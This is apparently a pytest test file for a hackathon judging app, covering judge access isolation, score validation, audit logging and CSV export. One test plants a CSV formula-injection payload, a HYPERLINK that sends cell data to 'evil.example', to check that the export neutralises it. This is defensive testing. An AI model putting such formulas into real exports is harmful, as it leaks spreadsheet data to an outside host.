"""Judge isolation (the CLAUDE.md role table), scoring rules and CSV export, over HTTP.

Every "no" in the role table is a request here that must come back 401/403/404.
"""

import csv
import io
import json
from datetime import timedelta

import pytest
from sqlalchemy import select

from app.models import Assignment, AuditLog, Event, JudgeTrack, Project, Score, utcnow
from app.seed import DEMO_SESSION_TOKENS, JUDGE_A, JUDGE_B

A_SCORES = "/api/judge/scores"


def demo(label: str) -> dict:
    return {"cookie": f"session={DEMO_SESSION_TOKENS[label]}"}


def fixture_scores_of(fixtures_data, judge_id):
    return {s["project"] for s in fixtures_data["scores"] if s["judge"] == judge_id}


# --- the run.py T2 checks -----------------------------------------------------------------------


def test_judge_sees_exactly_own_scores(client, seeded, fixtures_data):
    resp = client.get(A_SCORES, headers=demo("judge_a"))
    assert resp.status_code == 200
    rows = resp.json()["scores"]
    assert {r["judge_id"] for r in rows} == {JUDGE_A}
    assert {r["project_id"] for r in rows} == fixture_scores_of(fixtures_data, JUDGE_A)


def test_judge_can_name_themselves(client, seeded):
    assert client.get(A_SCORES, params={"judge": JUDGE_A}, headers=demo("judge_a")).status_code == 200


@pytest.mark.parametrize("target", [JUDGE_A, "jdg_01", "does-not-exist"])
def test_judge_b_cannot_read_other_judges(client, seeded, target):
    resp = client.get(A_SCORES, params={"judge": target}, headers=demo("judge_b"))
    assert resp.status_code == 403
    assert "scores" not in resp.json() and "weighted_total" not in resp.text  # no data leaked


def test_participant_blocked(client, seeded):
    assert client.get(A_SCORES, headers=demo("participant")).status_code == 403
    assert client.get(A_SCORES, params={"judge": JUDGE_A}, headers=demo("participant")).status_code == 403


def test_visitor_blocked(client, seeded):
    assert client.get(A_SCORES).status_code == 401
    assert client.get(A_SCORES, params={"judge": JUDGE_A}).status_code == 401


def test_organizer_reads_any_judge_and_all(client, seeded, fixtures_data):
    one = client.get(A_SCORES, params={"judge": JUDGE_A}, headers=demo("organizer")).json()
    assert {r["judge_id"] for r in one["scores"]} == {JUDGE_A}
    everything = client.get(A_SCORES, headers=demo("organizer")).json()
    assert len(everything["scores"]) == len(fixtures_data["scores"])
    assert client.get(A_SCORES, params={"judge": "nope"}, headers=demo("organizer")).status_code == 404


def test_csv_export_for_organizer(client, seeded, fixtures_data):
    resp = client.get("/api/export.csv", headers=demo("organizer"))
    assert resp.status_code == 200 and resp.headers["content-type"].startswith("text/csv")
    rows = list(csv.DictReader(io.StringIO(resp.text)))
    assert len(rows) == len(fixtures_data["scores"])
    assert {"functionality", "quality", "innovation", "weighted_total"} <= set(rows[0])


@pytest.mark.parametrize("label,status", [("judge_a", 403), ("participant", 403), (None, 401)])
def test_csv_export_blocked_for_others(client, seeded, label, status):
    headers = demo(label) if label else {}
    for kind in ("scores", "projects"):
        assert client.get("/api/export.csv", params={"kind": kind}, headers=headers).status_code == status


# --- judge queue and track isolation ------------------------------------------------------------


def test_judge_queue_only_has_own_track_assignments(client, seeded):
    rows = client.get("/api/judge/assignments", headers=demo("judge_a")).json()
    tracks = set(seeded.scalars(select(JudgeTrack.track_id).where(JudgeTrack.judge_id == JUDGE_A)))
    assert rows and all(seeded.get(Project, r["project_id"]).track_id in tracks for r in rows)


def test_judge_cannot_open_project_outside_queue(client, seeded):
    # prj_07/41 are trk_03; judge_a (jdg_09) only judges trk_01.
    assert client.get("/judge/projects/prj_41", headers=demo("judge_a")).status_code == 404


def test_wrong_assignment_still_cannot_cross_tracks(client, seeded):
    """Defence in depth: even if an organizer mis-assigns, the track check refuses."""
    seeded.add(Assignment(judge_id=JUDGE_A, project_id="prj_41"))
    seeded.commit()
    resp = client.post(A_SCORES, headers=demo("judge_a"), json={
        "project_id": "prj_41", "criteria": {"functionality": 5, "quality": 5, "innovation": 5}})
    assert resp.status_code == 404
    assert seeded.scalar(select(Score).where(Score.judge_id == JUDGE_A, Score.project_id == "prj_41")) is None


# --- writing scores -------------------------------------------------------------------------------


def a_project_of(db, judge_id):
    return db.scalar(select(Assignment.project_id).where(Assignment.judge_id == judge_id)
                     .order_by(Assignment.project_id))


def test_judge_updates_own_score_and_it_is_audited(client, seeded):
    pid = a_project_of(seeded, JUDGE_A)
    resp = client.post(A_SCORES, headers=demo("judge_a"), json={
        "project_id": pid, "criteria": {"functionality": 5, "quality": 4, "innovation": 3},
        "comment": "solid"})
    assert resp.status_code == 200
    assert resp.json()["weighted_total"] == pytest.approx(5 * 0.4 + 4 * 0.3 + 3 * 0.3)
    row = seeded.scalar(select(AuditLog).where(AuditLog.action == "score.update"))
    detail = json.loads(row.detail)
    assert row.actor_id == JUDGE_A and detail["before"] is not None and detail["after"]["comment"] == "solid"


@pytest.mark.parametrize("criteria", [
    {"functionality": 6, "quality": 4, "innovation": 3},
    {"functionality": 0, "quality": 4, "innovation": 3},
    {"functionality": "4.5", "quality": 4, "innovation": 3},
    {"functionality": 4, "quality": 4},                          # missing one
    {"functionality": 4, "quality": 4, "innovation": 4, "vibes": 5},
])
def test_invalid_scores_rejected(client, seeded, criteria):
    pid = a_project_of(seeded, JUDGE_A)
    resp = client.post(A_SCORES, headers=demo("judge_a"), json={"project_id": pid, "criteria": criteria})
    assert resp.status_code == 422


def test_judge_cannot_overwrite_another_judges_score(client, seeded):
    """judge_b scoring judge_a's project writes judge_b's own row, never judge_a's."""
    pid = a_project_of(seeded, JUDGE_A)
    before = client.get(A_SCORES, params={"judge": JUDGE_A}, headers=demo("organizer")).json()
    client.post(A_SCORES, headers=demo("judge_b"), json={
        "project_id": pid, "criteria": {"functionality": 1, "quality": 1, "innovation": 1}})
    after = client.get(A_SCORES, params={"judge": JUDGE_A}, headers=demo("organizer")).json()
    assert before == after


@pytest.mark.parametrize("label,status", [("organizer", 403), ("participant", 403), (None, 401)])
def test_only_judges_write_scores(client, seeded, label, status):
    headers = demo(label) if label else {}
    resp = client.post(A_SCORES, headers=headers, json={
        "project_id": "prj_01", "criteria": {"functionality": 5, "quality": 5, "innovation": 5}})
    assert resp.status_code == status


def test_scores_frozen_after_publish(client, seeded):
    seeded.get(Event, "evt_01").results_published_at = utcnow() - timedelta(minutes=1)
    seeded.commit()
    pid = a_project_of(seeded, JUDGE_A)
    resp = client.post(A_SCORES, headers=demo("judge_a"), json={
        "project_id": pid, "criteria": {"functionality": 5, "quality": 5, "innovation": 5}})
    assert resp.status_code == 409 and resp.json()["detail"]["error"] == "results_published"


def test_duplicate_project_cannot_be_scored(client, seeded):
    judge = seeded.scalar(select(Assignment.judge_id).where(Assignment.project_id == "prj_07"))
    from app.security import create_session
    from app.models import User
    token = create_session(seeded, seeded.get(User, judge))
    seeded.commit()
    resp = client.post(A_SCORES, headers={"cookie": f"session={token}"}, json={
        "project_id": "prj_07", "criteria": {"functionality": 5, "quality": 5, "innovation": 5}})
    assert resp.status_code == 409


def test_html_score_form(client, seeded):
    import re
    client.headers.update(demo("judge_a"))
    pid = a_project_of(seeded, JUDGE_A)
    page = client.get(f"/judge/projects/{pid}", headers={"accept": "text/html"})
    assert page.status_code == 200 and 'name="c_functionality"' in page.text
    token = re.search(r'name="csrf_token" value="([^"]+)"', page.text).group(1)
    resp = client.post(f"/judge/projects/{pid}", follow_redirects=False, headers={"accept": "text/html"},
                       data={"csrf_token": token, "c_functionality": "2", "c_quality": "3",
                             "c_innovation": "4", "comment": "ok"})
    assert resp.status_code == 303


# --- CSV injection ---------------------------------------------------------------------------------


def test_csv_neutralises_formulas(client, seeded):
    seeded.get(Project, "prj_01").title = '=HYPERLINK("http://evil.example/?"&A1,"click")'
    seeded.commit()
    body = client.get("/api/export.csv", params={"kind": "projects"}, headers=demo("organizer")).text
    rows = {r["project_id"]: r for r in csv.DictReader(io.StringIO(body))}
    assert rows["prj_01"]["title"].startswith("'=")


def test_export_is_audited(client, seeded):
    client.get("/api/export.csv", params={"kind": "projects", "event": "evt_01"}, headers=demo("organizer"))
    row = seeded.scalar(select(AuditLog).where(AuditLog.action == "export.csv"))
    assert row.actor_id == "usr_organizer" and row.entity_id == "projects"
